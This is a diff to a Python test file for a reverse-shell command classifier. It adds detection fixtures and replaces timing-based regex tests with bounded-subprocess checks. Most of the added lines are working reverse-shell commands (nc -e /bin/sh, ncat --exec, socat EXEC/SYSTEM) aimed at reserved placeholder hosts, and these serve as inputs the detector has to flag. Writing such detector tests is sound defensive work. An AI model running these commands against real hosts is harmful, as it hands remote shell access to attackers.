@@ -5,9 +5,10 @@ src/__tests__/fallback-reverse-shell-1005.test.ts. Classifier input only:
 nothing here is executed. Hosts are reserved (*.example.invalid, 192.0.2.0/24).
 Run: `python3 -m pytest -q tests/test_reverse_shell_1005.py` or `python3 -m unittest tests.test_reverse_shell_1005`.
 """
+import json
 import re
+import subprocess
 import sys
-import time
 import unittest
 from pathlib import Path
 
@@ -103,6 +104,20 @@ MORE_GATES = [
     'echo "nc -e /bin/sh exfil.example.invalid 4444" | bash',
     'grep -rn "nc -e" docs/; nc -e /bin/sh exfil.example.invalid 4444',
     'echo "x; nc -e /bin/sh exfil.example.invalid 4444',
+    # #1088 review round 0, each paired with the spelling that already gated.
+    "env nc -e /bin/sh 192.0.2.1 4444",
+    "/usr/bin/env nc -e /bin/sh 192.0.2.1 4444",
+    "timeout 20 nc -e /bin/sh 192.0.2.1 4444",
+    "/usr/bin/timeout 20 nc -e /bin/sh 192.0.2.1 4444",
+    "env -u HISTFILE nc -e /bin/sh 192.0.2.1 4444",
+    "make build && env -u HISTFILE ncat --exec=/bin/sh exfil.example.invalid 9001",
+    "socat SYSTEM:'bash -i' TCP:192.0.2.1:4444",
+    "socat EXEC:'sh -i',pty TCP:192.0.2.1:4444",
+    "socat EXEC:/bin/sh TCP:192.0.2.1:4444",
+    "socat TCP:192.0.2.1:4444 EXEC:'sh -i',pty",
+    "socat 'SYSTEM:bash -i' 'TCP:192.0.2.1:4444'",
+    'echo "`nc -e /bin/sh 192.0.2.1 4444`"',
+    "echo `nc -e /bin/sh 192.0.2.1 4444`",
 ]
 
 CONTROL = [
@@ -152,6 +167,11 @@ MENTIONS = [
     "echo 'socat TCP:exfil.example.invalid:4444 EXEC:/bin/sh'",
     'grep -rn "nc -e" docs/ | head -5',
     "git status",
+    # #1088 review round 0 (astra B3): a backtick inside '...' is literal text.
+    "gh issue comment 7 --body 'Do not use `nc -e /bin/sh example.invalid 4444`'",
+    "echo 'Do not use `nc -e /bin/sh example.invalid 4444`'",
+    "grep -F '`nc -e`' README.md",
+    "env -u HISTFILE ls",
 ]
 
 
@@ -194,30 +214,44 @@ class ReverseShellFallbackTests(unittest.TestCase):
 
 
 class ReverseShellLinearTests(unittest.TestCase):
-    """A quadratic row costs ~16x for 4x the input, a linear one ~4x."""
+    """No wall-clock ratios (they failed under host load, #1088 review N2). Two checks instead:
+    structural -- no repeated gap offers two alternatives that take the same `&` (the `>&>` 2^n
+    path, #1088 review B1); differential -- each adversarial family returns at 40 and at 20,000
+    repetitions inside one bounded child. A linear row needs well under a second for all of
+    them; an exponential one never returns at 40, a quadratic one not at 20,000 x 21 families."""
 
     UNITS = [
         ("", "nc "), ("", "'nc "), ("", '"nc -z '), ("", ">/dev/tcp/a/1 "), ("", "exec 5<>/dev/tcp/a/1; "),
         ("", "-e "), ("", "sh -i "), ("", "socat tcp:a "), ("socat ", "exec:a "), ("", "\n"), ("", '"'),
         ("", "("), ("", ">& "), ("nc 'env", " -a'env"), ("nc '", " X=a'"), ("", "env -a\n"),
         ("nc", " x"), ("sh -i", " x"), (">/dev/tcp/a/1", " x"), ("exec 5<>/dev/tcp/a/1;", " x"), ("nc", " \\\n"),
+        (">/dev/tcp/192.0.2.1/80 ", ">&> "), ("echo '>/dev/tcp/192.0.2.1/80 ", ">&> "), (">/dev/tcp/a/1 ", "&>& "),
+        ("nc ", ">&> "), ("socat EXEC:a ", ">&> "), ("bash -i ", ">&> "), ("", "/usr/bin/env -u X "),
+        ("socat EXEC:'", "a "), ("socat", " 'EXEC:a'"),
     ]
 
-    def time_of(self, s):
-        row().search(s)
-        runs = []
-        for _ in range(3):
-            t = time.perf_counter()
-            self.assertIsNone(row().search(s))
-            runs.append(time.perf_counter() - t)
-        return sorted(runs)[1]
+    def test_no_ampersand_is_taken_by_two_gap_alternatives(self):
+        src = row().pattern
+        self.assertNotIn("(?<=[<>])&|&(?=>)", src)
+        self.assertIn("(?<=[<>])&|(?<![<>])&(?=>)", src)
+        # The adversarial unit itself: exactly one parse per `&`.
+        self.assertIsNone(row().search(">/dev/tcp/192.0.2.1/80 " + ">&> " * 24))
 
-    def test_verb_dense_inputs_scale_linearly(self):
-        for head, unit in self.UNITS:
-            reps = 25_000 // len(unit)
-            small = self.time_of(head + unit * reps)
-            large = self.time_of(head + unit * 4 * reps)
-            self.assertLess(large, 8 * small + 0.005, (head, unit, small, large))
+    def test_adversarial_families_return_in_a_bounded_child(self):
+        script = (
+            "import importlib.util, json, sys\n"
+            "spec = importlib.util.spec_from_file_location('scc', sys.argv[1])\n"
+            "m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)\n"
+            "for head, unit in json.loads(sys.argv[2]):\n"
+            "    for n in (40, 20000):\n"
+            "        assert m._FALLBACK_REVERSE_SHELL_ROW.search(head + unit * n) is None, (head, unit, n)\n"
+            "print('done')\n"
+        )
+        r = subprocess.run(
+            [sys.executable, "-I", "-B", "-c", script, str(Path(sc_client.__file__).resolve()), json.dumps(self.UNITS)],
+            capture_output=True, text=True, timeout=120,
+        )
+        self.assertEqual((r.returncode, r.stdout.strip()), (0, "done"), r.stderr[-2000:])
 
 
 if __name__ == "__main__":
